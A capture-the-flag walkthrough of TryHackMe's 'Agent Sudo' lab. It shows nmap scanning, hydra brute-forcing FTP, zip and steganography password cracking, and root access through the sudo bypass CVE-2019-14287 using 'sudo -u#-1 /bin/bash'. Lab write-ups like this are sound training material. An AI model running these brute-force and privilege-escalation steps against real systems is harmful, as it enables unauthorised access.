# Agent Sudo
---

## Enumeration


```bash
kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Agent_Sudo$ nmap -p- 10.10.148.132 | tee open_ports
kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Agent_Sudo$ nmap -p 21,22,80 -sV -sC 10.10.148.132 | tee nmap_scan
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-18 20:54 UTC
Nmap scan report for 10.10.148.132
Host is up (0.086s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.21 seconds
```

Using a request editor and sending a request with C as User-Agent provides us with the name *chris* and tell us that he has a weak password, which we can try to bruteforce ftp with hydra.

```bash
kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Agent_Sudo$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.148.132 ftp
```

* FTP password: crystal
* Zip password: alien
(Files can be extracted with 7zip `$ 7z e zip_to_crack.zip`)
(Use foremost to extract the zip file from the *.png* image, then...)

```bash
kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Agent_Sudo$ locate zip2john
/usr/sbin/zip2john

kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Agent_Sudo$ /usr/sbin/zip2john ceva.zip > john.zip

kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Agent_Sudo$ john john.zip --show
ceva.zip/To_agentR.txt:alien:To_agentR.txt:ceva.zip:ceva.zip

1 password hash cracked, 0 left

#contents of the zip file
kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Agent_Sudo$ cat To_agentR.txt 
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

* steg password: Area51
```bash
$ stegcracker cute-alien.jpg
```

```bash
kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Agent_Sudo$ cat cute-alien.jpg.out 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

* SSH password: hackerrules!

* Sudo password for james is also: hackerrules!

```bash
james@agent-sudo:~$ sudo -l
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
* CVE: CVE-2019-14287
```bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
[sudo] password for james: 
root@agent-sudo:~# cat /root/root.txt
```
The sudo vulnerability CVE-2019-14287 is a security policy bypass issue that provides a user or a program the ability to execute commands as root on a Linux system when the "sudoers configuration" explicitly disallows the root access.
Exploiting the vulnerability requires the user to have sudo privileges that allow them to run commands with an arbitrary user ID, except root.
Running the command with id -1, gets treated as 0, which is always root

